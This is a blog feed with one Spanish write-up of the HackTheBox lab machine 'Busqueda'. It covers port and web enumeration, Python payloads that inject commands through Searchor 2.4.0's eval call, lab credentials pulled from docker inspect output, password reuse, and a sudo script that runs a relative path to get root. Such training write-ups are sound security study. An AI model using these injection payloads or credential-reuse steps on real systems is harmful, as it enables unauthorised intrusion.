<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-08-12T11:17:22-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">l1nvx - blog</title><subtitle>Publicare articulos sobre HackTheBox, TryHackme y algunas cosas que me llaman la atencion.
</subtitle><author><name>l1nvx</name></author><entry><title type="html">HackTheBox - Busqueda (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2023/08/12/Busqueda.html" rel="alternate" type="text/html" title="HackTheBox - Busqueda (easy)" /><published>2023-08-12T00:00:00-04:00</published><updated>2023-08-12T00:00:00-04:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2023/08/12/Busqueda</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2023/08/12/Busqueda.html"><![CDATA[<p><img src="https://www.hackthebox.com/storage/avatars/a6942ab57b6a79f71240420442027334.png" alt="busqueda-avatar" /></p>

<p>Busqueda es una maquina facil, comienza con una enumeracion web inicial, encontraremos y explotaremos una vulnerabilidad de Searchor que esta web utiliza.</p>

<p>Obtendremos una shell como el usuario svc, reutilizaremos credenciales y abusaremos de un script que llama a un archivo relativamente para escalar al usuario root.</p>

<h3 id="enumeracion"><strong>Enumeracion</strong></h3>
<p>Uso esta funcion para aumentar la la rapidez de enumeracion.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">λ ubuntu-pc Busqueda → which scan
scan <span class="o">()</span> <span class="o">{</span>
        target <span class="nv">$1</span>
        <span class="nb">sudo </span>nmap <span class="nt">--min-rate</span> 5000 <span class="nt">-p-</span> <span class="nt">--privileged</span> <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nv">$1</span> <span class="nt">-oN</span> nmap/all-tcp-ports.txt
        <span class="nv">ports</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>nmap/all-tcp-ports.txt | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"</span><span class="se">\d</span><span class="s2">+/tcp"</span> | <span class="nb">cut</span> <span class="nt">-d</span> / <span class="nt">-f</span> 1 | <span class="nb">tr</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>  <span class="s2">","</span> |sed <span class="s1">'s/,$//g'</span><span class="si">)</span>
        <span class="nb">sudo </span>nmap <span class="nt">-T4</span> <span class="nt">-p</span><span class="nv">$ports</span> <span class="nt">-A</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nv">$1</span> <span class="nt">-oN</span> nmap/all-tcp-versions.txt
<span class="o">}</span></code></pre></figure>

<p>Nmap encuentra 2 puertos abiertos, ademas de una redireccion a http://searcher.htb/ que un script de nmap detecto.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.52
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Did not follow redirect to http://searcher.htb/</code></pre></figure>

<p>Comprobamos usando curl.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">λ ubuntu-pc Busqueda → curl <span class="nt">--request</span> GET <span class="nt">--include</span> <span class="nt">--url</span> http://10.10.11.208
HTTP/1.1 302 Found
Date: Thu, 10 Aug 2023 01:59:10 GMT
Server: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
Location: http://searcher.htb/
Content-Length: 282
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1

&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;302 Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Found&lt;/h1&gt;
&lt;p&gt;The document has moved &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"http://searcher.htb/"</span><span class="o">&gt;</span>here&lt;/a&gt;.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.11.208 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;</code></pre></figure>

<p>De todas formas es posible que encontremos archivos en el servidor web fuzzeando.</p>

<p>Raramente no me funciona feroxbuster, usare ffuf.</p>

<p>Creo que feroxbuster no funciona porque la web no tiene un codigo de estado diferente al 302 ni una respuesta diferente en el body, feroxbuster no logra funcionar con el auto filtrado.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">λ ubuntu-pc Busqueda → ffuf <span class="nt">-u</span> http://10.10.11.208/FUZZ <span class="nt">-w</span> ~/SecLists/Discovery/Web-Content/common.txt  <span class="nt">-fs</span> 282

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.208/FUZZ
 :: Wordlist         : FUZZ: /home/l1nvx/SecLists/Discovery/Web-Content/common.txt
 :: Header           : User-Agent: Mozilla/5.0 (Linux; Android 5.1; iris 600 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 282
________________________________________________

[Status: 302, Size: 309, Words: 18, Lines: 10, Duration: 264ms]
| URL | http://10.10.11.208/render?url=https://www.google.com
| --&gt; | http://searcher.htb/?url=https://www.google.com
    * FUZZ: render?url=https://www.google.com

:: Progress: [4715/4715] :: Job [1/1] :: 149 req/sec :: Duration: [0:00:34] :: Errors: 0 ::</span></code></pre></figure>

<p>Nos salta “render?url=https://www.google.com” redirect, pero es un falso positivo.</p>

<p>Lo comprobamos con curl, de alguna forma apache al existir cualquier parametro en la url, lo añadira a la url “http://searcher.htb/$param”.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">λ ubuntu-pc Busqueda → curl <span class="nt">--request</span> GET <span class="nt">--include</span> <span class="nt">--url</span> <span class="s2">"http://10.10.11.208/notexists?fake=https://www.google.com"</span>
HTTP/1.1 302 Found
Date: Thu, 10 Aug 2023 02:06:42 GMT
Server: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
Location: http://searcher.htb/?fake<span class="o">=</span>https://www.google.com
Content-Length: 310
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1

&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;302 Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Found&lt;/h1&gt;
&lt;p&gt;The document has moved &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"http://searcher.htb/?fake=https://www.google.com"</span><span class="o">&gt;</span>here&lt;/a&gt;.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 10.10.11.208 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;</code></pre></figure>

<p>Añadimos el vhost a nuestro /etc/hosts.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">λ ubuntu-pc Busqueda → <span class="nb">echo </span>10.10.11.208 searcher.htb | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> contraseña para l1nvx:
10.10.11.208 searcher.htb</code></pre></figure>

<h3 id="configuracion-de-burpsuite"><strong>Configuracion De Burpsuite</strong></h3>

<p>Algo que yo siempre hago y recomiendo es utilizar un scope usando expresiones regulares, porque existe la posibilidad que en el codigo de la web realize una peticion a un subdominio.</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/burpsuite-scope.png" alt="burpsuite-scope" /></p>

<p>Tambien recomiendo que burpsuite muestre <strong>todo</strong>.</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/burpsuite-items.png" alt="burpsuite-items" /></p>

<h3 id="searchor"><strong>Searchor</strong></h3>

<p>Esto muestra la web, (esta traducida).</p>

<p>Algo interesante es que esta utilizando Python Flask y menciona un repositorio (version 2.4.0).
https://github.com/ArjunSharda/Searchor</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/web.png" alt="web" /></p>

<h3 id="github"><strong>Github</strong></h3>

<p>Siempre en los repositorios hay que buscar vulnerabiliades-bugs en commits, security advisories, y sus releases.</p>

<p>Encontramos una vulnerabilidad que fue parcheada para la version 2.4.2.</p>

<p>Posiblemente esta version (2.4.0) sea vulnerable.</p>

<p>Suele ocurrir que versiones un poco anterirores al parche sean vulnerables y no mas antiguas.</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/searchor-releases.png" alt="searchor-releases" /></p>

<p>Este es el pull request de la vulnerabilidad.</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/vuln-pull-request.png" alt="pull-request" /></p>

<p>Aqui estan los cambios realizados, elimina la funcion eval.</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/commit.png" alt="commit" /></p>

<p>Con eso en mente, veamos que podemos hacer con el buscador en http://searchor.htb</p>

<p>Nos permite seleccionar un motor de busqueda y nuestra query “l1nvx”, hay un campo “auto_redirect” que solamente te redireccionara a la plataforma de ese motor de busqueda con tu query.</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/search-web.png" alt="searchor-search" /></p>

<p>Al no marcar el auto redirect, nos muestra esto despues de realizar la peticion.</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/redirect.png" alt="redirect" /></p>

<p>Nos muestra burpsuite este body engine=Accuweather&amp;query=l1nvx&amp;auto_redirect=</p>

<p>Que engine y query son los campos que utliza la funcion eval.</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/burpsuite-request.png" alt="burpsuite-request" /></p>

<h3 id="rce"><strong>RCE</strong></h3>

<p>Probando rce en el campo engine nos da exito localmente.</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/engine-rce.png" alt="engine-rce" /></p>

<p>Pero en el servidor remoto no funciona. (Invalid Engine!)</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/engine-remote-rce.png" alt="engine-remote-rce" /></p>

<p>En el campo query tambien no da exito en local.</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/query-rce.png" alt="query-rce" /></p>

<p>Tambien en el servidor remoto.</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/query-remote-rce.png" alt="query-remote-rce" /></p>

<p>Dejo el codigo de python que use para probar rce.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># engine rce
</span>
<span class="k">class</span> <span class="nc">Engine</span><span class="p">:</span>
    <span class="k">class</span> <span class="nc">Accuweather</span><span class="p">:</span>
        <span class="k">def</span> <span class="nf">search</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">copy_url</span><span class="p">,</span> <span class="n">open_web</span><span class="p">):</span>
            <span class="k">return</span> <span class="sh">""</span>

<span class="n">query</span> <span class="o">=</span> <span class="sh">"</span><span class="s">l1nvx</span><span class="sh">"</span>
<span class="n">copy</span> <span class="o">=</span> <span class="bp">None</span>
<span class="nb">open</span> <span class="o">=</span> <span class="bp">None</span>
<span class="c1"># RCE
</span><span class="n">engine</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Accuweather|(__import__(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="s">).system(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="s">))#</span><span class="sh">"</span>
<span class="nf">eval</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Engine.</span><span class="si">{</span><span class="n">engine</span><span class="si">}</span><span class="s">.search(</span><span class="sh">'</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="sh">'</span><span class="s">, copy_url=</span><span class="si">{</span><span class="n">copy</span><span class="si">}</span><span class="s">, open_web=</span><span class="si">{</span><span class="nb">open</span><span class="si">}</span><span class="s">)</span><span class="sh">"</span><span class="p">)</span>


<span class="c1"># query rce
</span>
<span class="k">class</span> <span class="nc">Engine</span><span class="p">:</span>
    <span class="k">class</span> <span class="nc">Accuweather</span><span class="p">:</span>
        <span class="k">def</span> <span class="nf">search</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">copy_url</span><span class="p">,</span> <span class="n">open_web</span><span class="p">):</span>
            <span class="k">return</span> <span class="sh">""</span>
        
<span class="n">engine</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Accuweather</span><span class="sh">"</span>
<span class="n">copy</span> <span class="o">=</span> <span class="bp">None</span>
<span class="nb">open</span> <span class="o">=</span> <span class="bp">None</span>
<span class="c1"># RCE
</span><span class="n">query</span> <span class="o">=</span> <span class="sh">"'</span><span class="s"> + str(__import__(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="s">).system(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="s">)) + </span><span class="sh">'"</span>
<span class="nf">eval</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Engine.</span><span class="si">{</span><span class="n">engine</span><span class="si">}</span><span class="s">.search(</span><span class="sh">'</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="sh">'</span><span class="s">, copy_url=</span><span class="si">{</span><span class="n">copy</span><span class="si">}</span><span class="s">, open_web=</span><span class="si">{</span><span class="nb">open</span><span class="si">}</span><span class="s">)</span><span class="sh">"</span><span class="p">)</span></code></pre></figure>

<h3 id="usertxt"><strong>User.txt</strong></h3>

<p>Obtengo una shell de esta manera.</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/svc-shell.png" alt="svc-shell" /></p>

<p>En el directorio /home/svc encuentro user.txt</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/user-txt.png" alt="user-txt" /></p>

<h3 id="roottxt"><strong>Root.txt</strong></h3>

<p>Encontramos credenciales del usuario cody en nuestro home.</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/git-cody-password.png" alt="git-cody-password" /></p>

<p>En la configuracion de apache2 vemos que hay 2 configuraciones de vhost, que pasan por diferentes servidores internos.</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/apache-sites.png" alt="apache2-sites" /></p>

<p>Añadimos el vhost a nuestro /etc/hosts y visitamos.</p>

<p>Las credenciales cody:jh1usoih2bkjaspwe92 son validas para gitea.searcher.htb</p>

<p>Encontramos solo 1 repositorio y otro usuario “administrator”, el repositorio es el codigo de una implementacion del servicio de busqueda (searchor) que se utilizo en la web principal (proxy inverso).</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/repository.png" alt="repository" /></p>

<p>Con una contraseña podemos intentar utilizarla para sudo -l, en algunas maquinas es muy comun que se reutilizen contraseñas.</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/sudo.png" alt="sudo" /></p>

<p>Podemos ejecutar como root un script de python el cual no podemos leer.</p>

<p>Hay mas archivos en el directorio del script.</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/script.png" alt="script" /></p>

<p>Probando que parametros puedo utilizar en ese script, me imprime su ayuda.</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/script-help.png" alt="script-help" /></p>

<p>Los 2 ultimos comandos no funcionaron por alguna razon.</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/script-results.png" alt="script-results" /></p>

<p>Investigando los formatos que usa docker inspect encontre esta <a href="https://docs.docker.com/engine/reference/commandline/inspect/">pagina</a></p>

<p>Alfinal de la pagina muestra algo interesante <strong>{{ json .Config }}</strong></p>

<figure class="highlight"><pre><code class="language-sh" data-lang="sh">svc@busqueda:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect <span class="se">\{\{</span> json .Config <span class="se">\}\}</span> 960873171e2e
<span class="o">{</span><span class="s2">"Hostname"</span>:<span class="s2">"960873171e2e"</span>,<span class="s2">"Domainname"</span>:<span class="s2">""</span>,<span class="s2">"User"</span>:<span class="s2">""</span>,<span class="s2">"AttachStdin"</span>:false,<span class="s2">"AttachStdout"</span>:false,<span class="s2">"AttachStderr"</span>:false,<span class="s2">"ExposedPorts"</span>:<span class="o">{</span><span class="s2">"22/tcp"</span>:<span class="o">{}</span>,<span class="s2">"3000/tcp"</span>:<span class="o">{}}</span>,<span class="s2">"Tty"</span>:false,<span class="s2">"OpenStdin"</span>:false,<span class="s2">"StdinOnce"</span>:false,<span class="s2">"Env"</span>:[<span class="s2">"USER_UID=115"</span>,<span class="s2">"USER_GID=121"</span>,<span class="s2">"GITEA__database__DB_TYPE=mysql"</span>,<span class="s2">"GITEA__database__HOST=db:3306"</span>,<span class="s2">"GITEA__database__NAME=gitea"</span>,<span class="s2">"GITEA__database__USER=gitea"</span>,<span class="s2">"GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh"</span>,<span class="s2">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>,<span class="s2">"USER=git"</span>,<span class="s2">"GITEA_CUSTOM=/data/gitea"</span><span class="o">]</span>,<span class="s2">"Cmd"</span>:[<span class="s2">"/bin/s6-svscan"</span>,<span class="s2">"/etc/s6"</span><span class="o">]</span>,<span class="s2">"Image"</span>:<span class="s2">"gitea/gitea:latest"</span>,<span class="s2">"Volumes"</span>:<span class="o">{</span><span class="s2">"/data"</span>:<span class="o">{}</span>,<span class="s2">"/etc/localtime"</span>:<span class="o">{}</span>,<span class="s2">"/etc/timezone"</span>:<span class="o">{}}</span>,<span class="s2">"WorkingDir"</span>:<span class="s2">""</span>,<span class="s2">"Entrypoint"</span>:[<span class="s2">"/usr/bin/entrypoint"</span><span class="o">]</span>,<span class="s2">"OnBuild"</span>:null,<span class="s2">"Labels"</span>:<span class="o">{</span><span class="s2">"com.docker.compose.config-hash"</span>:<span class="s2">"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515"</span>,<span class="s2">"com.docker.compose.container-number"</span>:<span class="s2">"1"</span>,<span class="s2">"com.docker.compose.oneoff"</span>:<span class="s2">"False"</span>,<span class="s2">"com.docker.compose.project"</span>:<span class="s2">"docker"</span>,<span class="s2">"com.docker.compose.project.config_files"</span>:<span class="s2">"docker-compose.yml"</span>,<span class="s2">"com.docker.compose.project.working_dir"</span>:<span class="s2">"/root/scripts/docker"</span>,<span class="s2">"com.docker.compose.service"</span>:<span class="s2">"server"</span>,<span class="s2">"com.docker.compose.version"</span>:<span class="s2">"1.29.2"</span>,<span class="s2">"maintainer"</span>:<span class="s2">"maintainers@gitea.io"</span>,<span class="s2">"org.opencontainers.image.created"</span>:<span class="s2">"2022-11-24T13:22:00Z"</span>,<span class="s2">"org.opencontainers.image.revision"</span>:<span class="s2">"9bccc60cf51f3b4070f5506b042a3d9a1442c73d"</span>,<span class="s2">"org.opencontainers.image.source"</span>:<span class="s2">"https://github.com/go-gitea/gitea.git"</span>,<span class="s2">"org.opencontainers.image.url"</span>:<span class="s2">"https://github.com/go-gitea/gitea"</span><span class="o">}}</span>

svc@busqueda:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect <span class="se">\{\{</span> json .Config <span class="se">\}\}</span> f84a6b33fb5a
<span class="o">{</span><span class="s2">"Hostname"</span>:<span class="s2">"f84a6b33fb5a"</span>,<span class="s2">"Domainname"</span>:<span class="s2">""</span>,<span class="s2">"User"</span>:<span class="s2">""</span>,<span class="s2">"AttachStdin"</span>:false,<span class="s2">"AttachStdout"</span>:false,<span class="s2">"AttachStderr"</span>:false,<span class="s2">"ExposedPorts"</span>:<span class="o">{</span><span class="s2">"3306/tcp"</span>:<span class="o">{}</span>,<span class="s2">"33060/tcp"</span>:<span class="o">{}}</span>,<span class="s2">"Tty"</span>:false,<span class="s2">"OpenStdin"</span>:false,<span class="s2">"StdinOnce"</span>:false,<span class="s2">"Env"</span>:[<span class="s2">"MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF"</span>,<span class="s2">"MYSQL_USER=gitea"</span>,<span class="s2">"MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh"</span>,<span class="s2">"MYSQL_DATABASE=gitea"</span>,<span class="s2">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>,<span class="s2">"GOSU_VERSION=1.14"</span>,<span class="s2">"MYSQL_MAJOR=8.0"</span>,<span class="s2">"MYSQL_VERSION=8.0.31-1.el8"</span>,<span class="s2">"MYSQL_SHELL_VERSION=8.0.31-1.el8"</span><span class="o">]</span>,<span class="s2">"Cmd"</span>:[<span class="s2">"mysqld"</span><span class="o">]</span>,<span class="s2">"Image"</span>:<span class="s2">"mysql:8"</span>,<span class="s2">"Volumes"</span>:<span class="o">{</span><span class="s2">"/var/lib/mysql"</span>:<span class="o">{}}</span>,<span class="s2">"WorkingDir"</span>:<span class="s2">""</span>,<span class="s2">"Entrypoint"</span>:[<span class="s2">"docker-entrypoint.sh"</span><span class="o">]</span>,<span class="s2">"OnBuild"</span>:null,<span class="s2">"Labels"</span>:<span class="o">{</span><span class="s2">"com.docker.compose.config-hash"</span>:<span class="s2">"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b"</span>,<span class="s2">"com.docker.compose.container-number"</span>:<span class="s2">"1"</span>,<span class="s2">"com.docker.compose.oneoff"</span>:<span class="s2">"False"</span>,<span class="s2">"com.docker.compose.project"</span>:<span class="s2">"docker"</span>,<span class="s2">"com.docker.compose.project.config_files"</span>:<span class="s2">"docker-compose.yml"</span>,<span class="s2">"com.docker.compose.project.working_dir"</span>:<span class="s2">"/root/scripts/docker"</span>,<span class="s2">"com.docker.compose.service"</span>:<span class="s2">"db"</span>,<span class="s2">"com.docker.compose.version"</span>:<span class="s2">"1.29.2"</span><span class="o">}}</span></code></pre></figure>

<p>Datos interesantes.</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">MYSQL_DATABASE</span><span class="o">=</span><span class="n">gitea</span>
<span class="no">MYSQL_ROOT_PASSWORD</span><span class="o">=</span><span class="n">jI86kGUuj87guWr3RyF</span>
<span class="no">MYSQL_USER</span><span class="o">=</span><span class="n">gitea</span>
<span class="no">MYSQL_PASSWORD</span><span class="o">=</span><span class="n">yuiu1hoiu4i5ho1uh</span>
<span class="no">GITEA__database__USER</span><span class="o">=</span><span class="n">gitea</span>
<span class="no">GITEA__database__PASSWD</span><span class="o">=</span><span class="n">yuiu1hoiu4i5ho1uh</span></code></pre></figure>

<p>No pude conectarme a mysql por alguna razon.</p>

<p>En gitea utilizando la credencial <strong>yuiu1hoiu4i5ho1uh</strong> con el otro usuario <strong>administrator</strong>, puedo iniciar sesion.</p>

<p>Tengo acceso a un nuevo repositorio.</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/repository-2.png" alt="repository-2" /></p>

<p>Son los scripts que estan en /opt/scripts que no puedo leerlos, pero en gitea si los puedo leer.</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/repository-3.png" alt="repository-3" /></p>

<p>El codigo del script que puedo ejecutar usando sudo, se puede abusar de el porque llama a un archivo relativamente, (lo puedo crear).</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/repository-4.png" alt="repository-4" /></p>

<p>La funcionm run_command, ejecuta una lista de argumentos [”./full-checkup.sh”] usando subprocess.</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/repository-5.png" alt="repository-5" /></p>

<p>Obtengo root.</p>

<p><img src="/assets/hackthebox/img/machines/easy/busqueda/root.png" alt="root" /></p>]]></content><author><name>l1nvx</name></author><category term="hackthebox/machines/easy" /><summary type="html"><![CDATA[]]></summary></entry></feed>